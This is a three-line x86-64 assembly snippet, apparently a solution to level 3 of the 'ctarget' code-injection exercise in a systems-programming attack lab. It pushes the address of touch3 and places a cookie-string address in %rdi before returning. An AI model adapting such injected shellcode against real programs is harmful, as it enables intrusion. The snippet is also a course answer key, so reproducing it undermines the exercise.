#exploit code for ctarget level 3	
	pushq $0x4018fa  # push the addr of touch3
	movq $0x5561dca8, %rdi   # pass cookie string as argument
	ret   # return to the pushed return address
